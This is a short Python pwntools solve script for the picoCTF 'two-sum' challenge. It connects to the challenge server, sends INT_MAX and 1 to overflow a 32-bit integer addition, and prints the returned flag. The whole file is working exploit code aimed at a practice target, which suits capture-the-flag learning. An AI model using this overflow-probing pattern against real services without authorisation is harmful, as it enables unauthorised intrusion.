# picoCTF-two-sum-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *
INT_MAX = 2147483647

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 63204

    p = remote(host, port)

    # payload of two numbers that when added will cause an integer overflow
    payload = f"{INT_MAX} 1".encode("utf-8")

    # send payload
    p.recvuntil(b"possible: \n", timeout=1)
    p.sendline(payload)

    # receive flag
    p.recvuntil(b"overflow\n", timeout=1)
    flag = p.recvline(timeout=1).decode("utf-8").rstrip("\n").split(": ")[1]
    p.close()

    # reveal flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()